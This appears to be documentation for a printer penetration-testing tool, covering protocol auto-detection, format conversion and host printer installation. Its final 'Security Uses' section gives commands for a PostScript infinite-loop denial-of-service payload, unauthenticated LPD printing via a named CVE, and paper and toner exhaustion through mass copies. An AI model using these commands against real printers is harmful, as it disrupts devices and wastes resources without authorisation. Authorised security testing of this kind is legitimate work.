# Send Print Job

Send any file type to the target printer using smart protocol auto-detection, TLS upgrade, and ESC/P fallback for Epson inkjets.

---

## Smart Auto Mode (Recommended)

`--send-proto auto` (default) probes the printer before sending:
- Checks SNMP status (idle/busy/printing)
- Detects IPP, IPPS (TLS), LPD, and RAW availability
- Selects the best protocol automatically
- Converts the file to the correct format for the printer (ESC/P for Epson via LPD)
- Falls back from IPP to LPD if the printer rejects the format

```bash
# Auto-detect protocol (recommended)
python printer-reaper.py 192.168.1.100 --send-job document.txt

# Same as above (auto is default)
python printer-reaper.py 192.168.1.100 --send-job photo.jpg --send-proto auto
```

---

## Protocol Selection

```bash
# auto (default) — smart probe, picks best available protocol
python printer-reaper.py 192.168.1.100 --send-job doc.pdf

# IPP / IPPS — AirPrint compatible, auto-upgrades to TLS if required
python printer-reaper.py 192.168.1.100 --send-job doc.pdf --send-proto ipp

# LPD (port 515) — ESC/P native for Epson inkjets, prevents stuck-print issues
python printer-reaper.py 192.168.1.100 --send-job doc.pdf --send-proto lpd

# RAW (port 9100) — JetDirect passthrough for HP/PCL laser printers
python printer-reaper.py 192.168.1.100 --send-job doc.pdf --send-proto raw
```

> **Epson inkjets**: use `--send-proto lpd` — the tool will encode text/images as ESC/P commands (Epson native language) via LPD passthrough, which avoids the "stuck print" issue caused by sending raw JPEG via LPD.

---

## Supported File Formats

| Extension | Handling |
|-----------|---------|
| `.ps` `.eps` | Sent as PostScript (as-is) |
| `.pcl` | Sent as PCL (as-is) |
| `.pdf` | Ghostscript → PostScript, or raw PDF if GS unavailable |
| `.txt` `.rtf` | JPEG render via Pillow → ESC/P (Epson) → PostScript |
| `.png` `.jpg` `.jpeg` `.gif` `.bmp` `.tif` | ESC/P bitmap via Pillow → PostScript → raw |
| `.doc` `.docx` `.odt` | LibreOffice → PDF → PostScript (requires LibreOffice) |
| `*` (any) | Raw binary stream |

---

## Number of Copies

```bash
python printer-reaper.py 192.168.1.100 --send-job flyer.pdf --send-copies 10
python printer-reaper.py 192.168.1.100 --send-job memo.txt  --send-copies 50
```

---

## LPD Queue Name

When using `--send-proto lpd`, specify the queue name (default: `lp`):

```bash
python printer-reaper.py 192.168.1.100 --send-job doc.txt --send-proto lpd --send-queue lp
python printer-reaper.py 192.168.1.100 --send-job doc.txt --send-proto lpd --send-queue raw
```

---

## Install Printer on Host OS

If direct socket printing fails (printer hardened, format restrictions, authentication required), install the printer on the local OS and print through the system spooler:

```bash
# Windows (requires PowerShell as Administrator)
python printer-reaper.py 192.168.1.100 --install-printer

# With custom driver mode
python printer-reaper.py 192.168.1.100 --install-printer --install-driver cups-ipp
python printer-reaper.py 192.168.1.100 --install-printer --install-driver epson

# With custom name
python printer-reaper.py 192.168.1.100 --install-printer --install-name "LabPrinter"
```

**Driver modes:**
| Mode | Description |
|------|-------------|
| `auto` | IPP Everywhere (AirPrint) if port 631 is open, else generic RAW |
| `generic` | Generic / Text Only passthrough |
| `epson` | Epson Universal inkjet driver |
| `hp` | HP Universal PCL6 |
| `cups-ipp` | CUPS IPP Everywhere (best for Linux/macOS) |

After installation, print from any application selecting the installed printer name.

---

## Error Interpretation

| Error | Meaning | Solution |
|-------|---------|---------|
| `Document format not supported` | Printer rejects the MIME type | Switch to `--send-proto lpd` or use `--install-printer` |
| `Printer is busy` | Another job in queue | Wait, check printer LED, retry |
| `Forbidden / authentication required` | Hardened printer | Use `--install-printer` with OS driver |
| `Connection reset` | Epson rejects non-TLS | Automatically retried with TLS (IPPS) |
| `Port 515 closed` | LPD not available | Try `--send-proto ipp` or `--send-proto raw` |

---

## Security Uses

- **Deliver payloads** — send `.ps` with PostScript exploits (DoS loops, overlay, job capture)
- **Test anonymous job submission** — verify CVE-2023-27516 (unauthenticated LPD print)
- **Audit physical access** — print a page to prove exploitation capability
- **Resource exhaustion** — send 1000 copies to exhaust paper, toner, or memory

```bash
# Epson LPD unauthenticated print (CVE-2023-27516)
python printer-reaper.py 192.168.1.100 --send-job payload.txt --send-proto lpd

# PostScript DoS via IPP
echo "{ } loop" > payload.ps
python printer-reaper.py 192.168.1.100 --send-job payload.ps --send-proto ipp
```
